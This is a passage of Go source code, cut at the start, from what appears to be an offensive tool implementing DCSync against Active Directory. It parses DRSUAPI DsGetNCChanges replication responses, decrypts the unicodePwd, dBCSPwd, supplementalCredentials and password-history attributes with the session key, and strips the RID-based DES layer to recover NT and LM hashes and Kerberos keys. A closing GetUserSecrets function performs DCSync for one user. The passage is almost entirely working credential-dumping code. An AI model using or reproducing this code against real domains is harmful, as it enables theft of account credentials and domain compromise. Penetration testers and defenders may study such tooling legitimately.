	// Parse each PREFIX_TABLE_ENTRY (fixed part)
	for i := uint32(0); i < count; i++ {
		var ndx uint32
		binary.Read(r, binary.LittleEndian, &ndx)

		// OID_t: length (4) + elements pointer (4)
		var length uint32
		binary.Read(r, binary.LittleEndian, &length)
		var ptrElements uint32
		binary.Read(r, binary.LittleEndian, &ptrElements)

		if build.Debug && i < 3 {
			log.Printf("[D] PrefixEntry[%d]: ndx=%d, oid_len=%d, oid_ptr=0x%x", i, ndx, length, ptrElements)
		}
		_ = ndx
		_ = length
		_ = ptrElements
	}

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] parsePrefixTable: after fixed part (count=%d entries), pos=%d", count, pos)
	}

	// Now parse the deferred OID data
	for i := uint32(0); i < count; i++ {
		var maxLen uint32
		binary.Read(r, binary.LittleEndian, &maxLen)

		if build.Debug && i < 3 {
			log.Printf("[D] PrefixOID[%d]: maxLen=%d", i, maxLen)
		}

		// Sanity check - OID shouldn't be more than a few hundred bytes
		if maxLen > 1000 {
			if build.Debug {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] WARNING: PrefixOID[%d] maxLen=%d seems too large at pos=%d, likely parsing error", i, maxLen, pos)
				// Show bytes around this position
				peek := make([]byte, 32)
				r.Seek(pos-4, 0) // Go back to read the maxLen bytes too
				n, _ := r.Read(peek)
				log.Printf("[D] Bytes at pos %d: %x", pos-4, peek[:n])
			}
			break
		}

		oidBytes := make([]byte, maxLen)
		r.Read(oidBytes)

		prefixTable[uint32(i)] = oidBytes

		// Align to 4 bytes
		if maxLen%4 != 0 {
			r.Seek(int64(4-maxLen%4), 1)
		}
	}

	if build.Debug {
		endPos, _ := r.Seek(0, 1)
		log.Printf("[D] parsePrefixTable: endPos=%d, total bytes consumed=%d", endPos, endPos-startPos)
	}

	_ = maxCount
}

// entryHeader holds the fixed parts of a REPLENTINFLIST entry
type entryHeader struct {
	ptrNext       uint32
	ptrName       uint32
	flags         uint32
	attrCount     uint32
	ptrAttr       uint32
	isNCPrefix    uint32
	ptrParentGuid uint32
	ptrMetaData   uint32
}

func parseREPLENTINFLIST(r *bytes.Reader, sessionKey []byte, prefixTable map[uint32][]byte, numObjects uint32) []ReplicatedObject {
	var objects []ReplicatedObject

	// REPLENTINFLIST is a linked list
	// NDR layout: all fixed parts first, then all deferred data
	// Structure per entry:
	// - pNextEntInf (4 bytes) - pointer to next entry (0 if last)
	// - ENTINF inline structure:
	//   - pName (4 bytes) - pointer to DSNAME
	//   - ulFlags (4 bytes)
	//   - AttrBlock inline:
	//     - attrCount (4 bytes)
	//     - pAttr (4 bytes) - pointer to ATTR array
	// - fIsNCPrefix (4 bytes)
	// - pParentGuid (4 bytes) - pointer to GUID
	// - pMetaDataExt (4 bytes) - pointer to PROPERTY_META_DATA_EXT_VECTOR

	startPos, _ := r.Seek(0, 1)

	if build.Debug {
		// Show first 64 bytes at start of REPLENTINFLIST
		peek := make([]byte, 64)
		n, _ := r.Read(peek)
		log.Printf("[D] parseREPLENTINFLIST: startPos=%d, first %d bytes: %x, expecting %d objects", startPos, n, peek[:n], numObjects)
		r.Seek(startPos, 0) // Seek back
	}

	// First, read all fixed parts for all entries in the linked list
	// Stop when ptrNext is 0 (end of list) or when we've read numObjects entries
	var entries []entryHeader

	for i := uint32(0); i < numObjects; i++ {
		entryStartPos, _ := r.Seek(0, 1)

		var entry entryHeader
		binary.Read(r, binary.LittleEndian, &entry.ptrNext)
		binary.Read(r, binary.LittleEndian, &entry.ptrName)
		binary.Read(r, binary.LittleEndian, &entry.flags)
		binary.Read(r, binary.LittleEndian, &entry.attrCount)
		binary.Read(r, binary.LittleEndian, &entry.ptrAttr)
		binary.Read(r, binary.LittleEndian, &entry.isNCPrefix)
		binary.Read(r, binary.LittleEndian, &entry.ptrParentGuid)
		binary.Read(r, binary.LittleEndian, &entry.ptrMetaData)

		if build.Debug && (i < 5 || i >= 45 || i == numObjects-1) {
			log.Printf("[D] Entry %d at pos %d: ptrNext=0x%x, ptrName=0x%x, flags=0x%x, attrCount=%d, ptrAttr=0x%x, ptrParentGuid=0x%x, ptrMetaData=0x%x",
				i, entryStartPos, entry.ptrNext, entry.ptrName, entry.flags, entry.attrCount, entry.ptrAttr, entry.ptrParentGuid, entry.ptrMetaData)
		}

		// Stop at end of linked list (ptrNext == 0)
		// Also stop if we see garbage values (sanity check)
		if entry.ptrNext == 0 {
			entries = append(entries, entry)
			if build.Debug {
				log.Printf("[D] Entry %d has ptrNext=0, end of linked list (expected %d entries)", i, numObjects)
			}
			break
		}

		// Sanity check: ptrNext should be a small referent ID, not a large random value
		if entry.ptrNext > 0x100000 {
			if build.Debug {
				log.Printf("[D] Entry %d has suspicious ptrNext=0x%x, stopping (expected %d entries)", i, entry.ptrNext, numObjects)
			}
			break
		}

		entries = append(entries, entry)
	}

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] Parsed %d entry headers from linked list, now at pos=%d", len(entries), pos)
		// Show bytes at this position
		peek := make([]byte, 64)
		n, _ := r.Read(peek)
		log.Printf("[D] Bytes at deferred data start (pos=%d): %x", pos, peek[:n])
		r.Seek(pos, 0) // Seek back

		// If we stopped early, show what caused it
		if len(entries) < int(numObjects) {
			expectedPos := startPos + int64(len(entries))*32
			log.Printf("[D] Expected entry at pos %d (should read 281 entries but got %d)", expectedPos, len(entries))
			// Show bytes at where we stopped
			r.Seek(expectedPos, 0)
			badBytes := make([]byte, 64)
			n, _ := r.Read(badBytes)
			log.Printf("[D] Bytes at stopped position (%d): %x", expectedPos, badBytes[:n])
			r.Seek(pos, 0)
		}
	}

	// Now parse deferred data for each entry in order
	for i, entry := range entries {
		obj := &ReplicatedObject{}

		if build.Debug && i < 5 {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] Parsing deferred data for entry %d at pos %d (ptrName=0x%x, attrCount=%d, ptrAttr=0x%x)",
				i, pos, entry.ptrName, entry.attrCount, entry.ptrAttr)
		}

		// 1. pName -> DSNAME
		if entry.ptrName != 0 {
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: before parseDSNAME at pos %d", i, pos)
			}
			parseDSNAMEIntoObject(r, obj)
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: after parseDSNAME at pos %d, DN=%s", i, pos, obj.DN)
			}
		}

		// 2. pAttr -> ATTR array
		if entry.ptrAttr != 0 && entry.attrCount > 0 {
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: before parseATTRBLOCK at pos %d (attrCount=%d)", i, pos, entry.attrCount)
			}
			parseATTRBLOCK(r, entry.attrCount, obj, sessionKey)
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: after parseATTRBLOCK at pos %d", i, pos)
			}
		}

		// 3. pParentGuid -> GUID (skip)
		if entry.ptrParentGuid != 0 {
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: skipping pParentGuid (16 bytes) at pos %d", i, pos)
			}
			r.Seek(16, 1)
		}

		// 4. pMetaData -> PROPERTY_META_DATA_EXT_VECTOR
		// Note: Metadata parsing is complex and the layout varies. Since we only need
		// attributes (credentials are in ATTRBLOCK), we skip metadata entirely.
		// The position will be handled by the start of the next entry's deferred data.
		if entry.ptrMetaData != 0 {
			if build.Debug && i < 5 {
				pos, _ := r.Seek(0, 1)
				log.Printf("[D] Entry %d: skipping pMetaData (position at %d)", i, pos)
			}
			// Don't call skipPropertyMetaDataExtVector - let the next entry's parsing handle position
		}

		// If sAMAccountName is empty, extract it from DN
		if obj.SAMAccountName == "" && obj.DN != "" {
			if strings.HasPrefix(obj.DN, "CN=") {
				parts := strings.SplitN(obj.DN[3:], ",", 2)
				if len(parts) > 0 {
					obj.SAMAccountName = parts[0]
				}
			}
		}

		// Only add objects that have useful data (have a SAMAccountName or NT hash)
		if obj.SAMAccountName != "" || len(obj.NTHash) > 0 {
			objects = append(objects, *obj)
			if build.Debug {
				log.Printf("[D] Parsed object: DN=%s, SAM=%s, RID=%d", obj.DN, obj.SAMAccountName, obj.RID)
			}
		}
	}

	return objects
}

func parseENTINF(r *bytes.Reader, sessionKey []byte) *ReplicatedObject {
	obj := &ReplicatedObject{}

	// pName (DSNAME*) pointer
	var ptrName uint32
	binary.Read(r, binary.LittleEndian, &ptrName)

	// ulFlags
	var flags uint32
	binary.Read(r, binary.LittleEndian, &flags)

	// AttrBlock - ATTRBLOCK inline structure
	// attrCount (DWORD)
	var attrCount uint32
	binary.Read(r, binary.LittleEndian, &attrCount)

	// pAttr pointer
	var ptrAttr uint32
	binary.Read(r, binary.LittleEndian, &ptrAttr)

	// Parse DSNAME deferred data to get DN and GUID
	if ptrName != 0 {
		parseDSNAMEIntoObject(r, obj)
	}

	// Parse attributes
	if ptrAttr != 0 && attrCount > 0 {
		parseATTRBLOCK(r, attrCount, obj, sessionKey)
	}

	_ = flags

	return obj
}

// findValidDSNAME searches forward from startPos for a valid-looking DSNAME structure.
// This is used when NDR parsing gets misaligned due to variable-length metadata.
func findValidDSNAME(r *bytes.Reader, startPos int64) (found bool, maxCount uint32) {
	// Search forward in 4-byte increments for a valid-looking DSNAME
	// DSNAME: [MaxCount][structLen][SidLen][Guid][Sid][NameLen][StringName]
	// We validate: MaxCount < 500, SidLen <= 28, structLen reasonable
	for offset := int64(0); offset < 2000; offset += 4 {
		r.Seek(startPos+offset, 0)
		var testMaxCount, testStructLen, testSidLen uint32
		binary.Read(r, binary.LittleEndian, &testMaxCount)
		binary.Read(r, binary.LittleEndian, &testStructLen)
		binary.Read(r, binary.LittleEndian, &testSidLen)

		// Validate: MaxCount between 1-500, structLen 60-2000, SidLen 0-28
		if testMaxCount > 0 && testMaxCount < 500 &&
			testStructLen >= 60 && testStructLen < 2000 &&
			testSidLen <= 28 {
			r.Seek(startPos+offset, 0)
			return true, testMaxCount
		}
	}
	return false, 0
}

func parseDSNAMEIntoObject(r *bytes.Reader, obj *ReplicatedObject) {
	startPos, _ := r.Seek(0, 1)

	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	// Sanity check - if maxCount looks like garbage, try to find a valid DSNAME structure
	if maxCount > 10000 || maxCount == 0 {
		found, foundMaxCount := findValidDSNAME(r, startPos+4) // Start at +4 since we already read 4 bytes
		if !found {
			r.Seek(startPos, 0)
			return
		}
		maxCount = foundMaxCount
		// Re-read maxCount at new position
		binary.Read(r, binary.LittleEndian, &maxCount)
	}

	var structLen uint32
	binary.Read(r, binary.LittleEndian, &structLen)

	var sidLen uint32
	binary.Read(r, binary.LittleEndian, &sidLen)

	// GUID (16 bytes)
	r.Read(obj.GUID[:])

	// Sid (28 bytes)
	sid := make([]byte, 28)
	r.Read(sid)
	if sidLen > 0 && sidLen <= 28 {
		obj.ObjectSid = sid[:sidLen]
		// Extract RID (last 4 bytes of SID)
		if sidLen >= 8 {
			obj.RID = binary.LittleEndian.Uint32(sid[sidLen-4:])
		}
	}

	// NameLen
	var nameLen uint32
	binary.Read(r, binary.LittleEndian, &nameLen)

	// StringName (UTF-16LE)
	if nameLen > 0 && maxCount > 0 && nameLen <= maxCount {
		nameBytes := make([]byte, maxCount*2)
		r.Read(nameBytes)
		obj.DN = utf16le.DecodeToString(nameBytes[:nameLen*2])
	}

	// Align to 4 bytes
	pos, _ := r.Seek(0, 1)
	if pos%4 != 0 {
		r.Seek(int64(4-pos%4), 1)
	}
}

func parseATTRBLOCK(r *bytes.Reader, attrCount uint32, obj *ReplicatedObject, sessionKey []byte) {
	startPos, _ := r.Seek(0, 1)

	// Conformant array: MaxCount
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	// Sanity check
	if maxCount > 10000 || attrCount > 10000 {
		if build.Debug {
			log.Printf("[D] WARNING: parseATTRBLOCK maxCount=%d, attrCount=%d too large at pos=%d, skipping", maxCount, attrCount, startPos)
		}
		r.Seek(startPos, 0)
		return
	}

	// Set a reasonable max size for ATTRBLOCK deferred data (100KB should be plenty for most objects)
	const maxATTRBLOCKSize = 100000
	maxPos := startPos + maxATTRBLOCKSize

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] parseATTRBLOCK: maxCount=%d, attrCount=%d, pos=%d", maxCount, attrCount, pos)
	}

	// Read all ATTR structures first (fixed part)
	// Use maxCount (NDR conformance) not attrCount (from header) - they may differ
	type attrHeader struct {
		attrTyp  uint32
		valCount uint32
		pAVal    uint32
	}
	attrs := make([]attrHeader, maxCount)

	for i := uint32(0); i < maxCount; i++ {
		binary.Read(r, binary.LittleEndian, &attrs[i].attrTyp)
		binary.Read(r, binary.LittleEndian, &attrs[i].valCount)
		binary.Read(r, binary.LittleEndian, &attrs[i].pAVal)
		if build.Debug && (i < 5 || i >= maxCount-3) {
			log.Printf("[D] ATTR[%d]: attrTyp=0x%x, valCount=%d, pAVal=0x%x", i, attrs[i].attrTyp, attrs[i].valCount, attrs[i].pAVal)
		}
	}

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] parseATTRBLOCK: after ATTR headers, pos=%d", pos)
	}

	// NDR serialization for nested structures:
	// For each ATTRVALBLOCK (pointed to by pAVal):
	//   1. Conformance (MaxCount for ATTRVAL array)
	//   2. All ATTRVAL inline parts: (valLen, pVal) pairs
	//   3. All ATTRVAL deferred data: actual value bytes
	// Then the next ATTRVALBLOCK follows.
	//
	// We process each ATTRVALBLOCK completely before moving to the next.

	for i := uint32(0); i < maxCount; i++ {
		if attrs[i].pAVal == 0 || attrs[i].valCount == 0 {
			continue
		}

		attrTyp := attrs[i].attrTyp

		if build.Debug && (i < 5 || i >= maxCount-3) {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] ATTRVALBLOCK[%d]: pos=%d, attrTyp=0x%x", i, pos, attrTyp)
		}

		// Check position before reading more
		currentPos, _ := r.Seek(0, 1)
		if currentPos > maxPos {
			if build.Debug {
				log.Printf("[D] parseATTRBLOCK: exceeded maxPos at attr %d, bailing out", i)
			}
			r.Seek(startPos, 0)
			return
		}

		// Read conformant array MaxCount
		var valMaxCount uint32
		binary.Read(r, binary.LittleEndian, &valMaxCount)

		// Sanity check valMaxCount
		if valMaxCount > 10000 {
			if build.Debug {
				log.Printf("[D] ATTRVALBLOCK[%d]: valMaxCount=%d too large, bailing out", i, valMaxCount)
			}
			r.Seek(startPos, 0)
			return
		}

		// Use struct's valCount for inline element count
		// The NDR conformance should match, but trust the struct field
		actualInlineCount := attrs[i].valCount

		if build.Debug && (i < 5 || i >= maxCount-3) {
			log.Printf("[D] ATTRVALBLOCK[%d]: valMaxCount=%d, valCount=%d, actualInlineCount=%d",
				i, valMaxCount, attrs[i].valCount, actualInlineCount)
		}

		if actualInlineCount > 10000 {
			if build.Debug {
				log.Printf("[D] ATTRVALBLOCK[%d]: skipping garbage actualInlineCount=%d", i, actualInlineCount)
			}
			r.Seek(startPos, 0)
			return
		}

		// Read inline (valLen, pVal) pairs based on valCount from struct
		valLens := make([]uint32, actualInlineCount)
		hasPVals := make([]bool, actualInlineCount)
		for j := uint32(0); j < actualInlineCount; j++ {
			binary.Read(r, binary.LittleEndian, &valLens[j])
			var pVal uint32
			binary.Read(r, binary.LittleEndian, &pVal)
			hasPVals[j] = pVal != 0
			if build.Debug && i < 5 && j < 3 {
				log.Printf("[D] ATTRVALBLOCK[%d] val[%d]: valLen=%d, pVal=0x%x", i, j, valLens[j], pVal)
			}
		}

		// Now read deferred value bytes for each ATTRVAL with non-null pVal
		// Each pVal is [size_is(valLen)] UCHAR*, so each deferred referent has:
		// - Conformance (4 bytes, should equal valLen)
		// - Data bytes (valLen)
		// - Alignment padding

		actualValCount := attrs[i].valCount
		for j := uint32(0); j < actualValCount; j++ {
			if !hasPVals[j] {
				continue
			}

			// Read pVal conformance (should equal valLen from inline data)
			var pValConformance uint32
			binary.Read(r, binary.LittleEndian, &pValConformance)

			if build.Debug && i < 5 && j < 3 {
				log.Printf("[D] ATTRVALBLOCK[%d] val[%d] deferred: pValConformance=%d, expected valLen=%d",
					i, j, pValConformance, valLens[j])
			}

			// Sanity check - conformance should match valLen and be reasonable
			if pValConformance > 100000 {
				if build.Debug {
					pos, _ := r.Seek(0, 1)
					log.Printf("[D] ATTRVALBLOCK[%d] val[%d]: skipping huge pValConformance=%d at pos=%d", i, j, pValConformance, pos)
				}
				// Reset to start and bail out
				r.Seek(startPos, 0)
				return
			}

			// Check if we would exceed maxPos
			currentPos, _ := r.Seek(0, 1)
			if currentPos+int64(pValConformance) > maxPos {
				if build.Debug {
					log.Printf("[D] ATTRVALBLOCK[%d]: exceeding maxPos, bailing out at pos=%d", i, currentPos)
				}
				r.Seek(startPos, 0)
				return
			}

			// Read the actual value bytes using the conformance (not valLen)
			valData := make([]byte, pValConformance)
			r.Read(valData)

			// Align to 4 bytes after each value
			if pValConformance%4 != 0 {
				r.Seek(int64(4-pValConformance%4), 1)
			}

			// Process attribute based on type
			processAttribute(attrTyp, valData, obj, sessionKey)
		}

		if build.Debug && (i < 5 || i >= maxCount-3) {
			pos, _ := r.Seek(0, 1)
			log.Printf("[D] ATTRVALBLOCK[%d]: after deferred data, pos=%d", i, pos)
		}
	}

	if build.Debug {
		pos, _ := r.Seek(0, 1)
		log.Printf("[D] parseATTRBLOCK: complete, pos=%d", pos)
	}
}

func processAttribute(attrTyp uint32, valData []byte, obj *ReplicatedObject, sessionKey []byte) {
	switch attrTyp {
	case DRSUAPI_ATTID_sAMAccountName:
		// UTF-16LE string
		obj.SAMAccountName = utf16le.DecodeToString(valData)

	case DRSUAPI_ATTID_objectSid:
		obj.ObjectSid = valData
		// Extract RID from SID
		if len(valData) >= 8 {
			obj.RID = binary.LittleEndian.Uint32(valData[len(valData)-4:])
		}

	case DRSUAPI_ATTID_userAccountControl:
		if len(valData) >= 4 {
			obj.UserAccountControl = binary.LittleEndian.Uint32(valData)
		}

	case DRSUAPI_ATTID_unicodePwd:
		// Encrypted NTLM hash
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			obj.NTHash = removeDESLayer(decrypted, obj.RID)
		}

	case DRSUAPI_ATTID_dBCSPwd:
		// Encrypted LM hash
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			obj.LMHash = removeDESLayer(decrypted, obj.RID)
		}

	case DRSUAPI_ATTID_supplementalCredentials:
		// Encrypted supplemental credentials (Kerberos keys, etc.)
		obj.SupplementalCreds = decryptAttribute(valData, sessionKey)
		// Parse Kerberos keys from supplementalCredentials
		if keys, err := ParseSupplementalCredentials(obj.SupplementalCreds); err == nil {
			obj.KerberosKeys = keys
		}

	case DRSUAPI_ATTID_pwdLastSet:
		// Windows FILETIME: 64-bit little-endian (100ns intervals since 1601-01-01)
		if len(valData) >= 8 {
			obj.PwdLastSet = int64(binary.LittleEndian.Uint64(valData))
		}

	case DRSUAPI_ATTID_ntPwdHistory:
		// Encrypted NT hash history — contains multiple 16-byte hashes concatenated
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			// Each entry is 16 bytes; decrypt each with RID-based DES
			for off := 0; off+16 <= len(decrypted); off += 16 {
				h := removeDESLayer(decrypted[off:off+16], obj.RID)
				if len(h) == 16 {
					obj.NTHashHistory = append(obj.NTHashHistory, h)
				}
			}
		}

	case DRSUAPI_ATTID_lmPwdHistory:
		// Encrypted LM hash history — contains multiple 16-byte hashes concatenated
		decrypted := decryptAttribute(valData, sessionKey)
		if len(decrypted) >= 16 && obj.RID != 0 {
			for off := 0; off+16 <= len(decrypted); off += 16 {
				h := removeDESLayer(decrypted[off:off+16], obj.RID)
				if len(h) == 16 {
					obj.LMHashHistory = append(obj.LMHashHistory, h)
				}
			}
		}
	}
}

// decryptAttribute decrypts an ENCRYPTED_PAYLOAD structure
// Structure: Salt (16 bytes) + encrypted data
// Decryption: RC4(MD5(sessionKey + Salt), encryptedData)
// Returns: decrypted data (first 4 bytes are checksum, rest is actual data)
func decryptAttribute(data []byte, sessionKey []byte) []byte {
	if len(data) < 20 { // 16 salt + at least 4 bytes
		return nil
	}

	salt := data[:16]
	encrypted := data[16:]

	// Derive RC4 key: MD5(sessionKey + salt)
	h := md5.New()
	h.Write(sessionKey)
	h.Write(salt)
	rc4Key := h.Sum(nil)

	// Decrypt with RC4
	cipher, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil
	}

	decrypted := make([]byte, len(encrypted))
	cipher.XORKeyStream(decrypted, encrypted)

	// First 4 bytes are CRC32 checksum, skip them
	if len(decrypted) < 4 {
		return nil
	}

	return decrypted[4:]
}

// removeDESLayer removes the RID-based DES encryption layer from password hashes
func removeDESLayer(encryptedHash []byte, rid uint32) []byte {
	if len(encryptedHash) < 16 {
		return nil
	}

	key1, key2 := deriveDesKeys(rid)

	// DES decrypt each 8-byte block
	block1 := desDecrypt(encryptedHash[:8], key1)
	block2 := desDecrypt(encryptedHash[8:16], key2)

	result := make([]byte, 16)
	copy(result[:8], block1)
	copy(result[8:], block2)

	return result
}

// deriveDesKeys derives two 8-byte DES keys from a RID
func deriveDesKeys(rid uint32) ([]byte, []byte) {
	ridBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ridBytes, rid)

	// Key1: I[0], I[1], I[2], I[3], I[0], I[1], I[2]
	key1Src := []byte{ridBytes[0], ridBytes[1], ridBytes[2], ridBytes[3], ridBytes[0], ridBytes[1], ridBytes[2]}
	// Key2: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
	key2Src := []byte{ridBytes[3], ridBytes[0], ridBytes[1], ridBytes[2], ridBytes[3], ridBytes[0], ridBytes[1]}

	return transformToDesKey(key1Src), transformToDesKey(key2Src)
}

// transformToDesKey converts 7 bytes to an 8-byte DES key with parity bits
func transformToDesKey(key7 []byte) []byte {
	key8 := make([]byte, 8)

	key8[0] = key7[0] >> 1
	key8[1] = ((key7[0] & 0x01) << 6) | (key7[1] >> 2)
	key8[2] = ((key7[1] & 0x03) << 5) | (key7[2] >> 3)
	key8[3] = ((key7[2] & 0x07) << 4) | (key7[3] >> 4)
	key8[4] = ((key7[3] & 0x0F) << 3) | (key7[4] >> 5)
	key8[5] = ((key7[4] & 0x1F) << 2) | (key7[5] >> 6)
	key8[6] = ((key7[5] & 0x3F) << 1) | (key7[6] >> 7)
	key8[7] = key7[6] & 0x7F

	// Set parity bits
	for i := 0; i < 8; i++ {
		key8[i] = (key8[i] << 1) & 0xFE
	}

	return key8
}

// desDecrypt performs single DES ECB decryption
func desDecrypt(data []byte, key []byte) []byte {
	if len(data) != 8 || len(key) != 8 {
		return data
	}

	block, err := des.NewCipher(key)
	if err != nil {
		return data
	}

	decrypted := make([]byte, 8)
	block.Decrypt(decrypted, data)
	return decrypted
}

// GetUserSecrets performs DCSync for a single user
func GetUserSecrets(client *dcerpc.Client, hBind []byte, userDN string, domainDN string, dsaGuid [16]byte, sessionKey []byte) (*ReplicatedObject, error) {
	result, err := DsGetNCChanges(client, hBind, domainDN, userDN, dsaGuid, sessionKey)
	if err != nil {
		return nil, err
	}

	if len(result.Objects) == 0 {
		return nil, fmt.Errorf("no objects returned")
	}

	return &result.Objects[0], nil
}
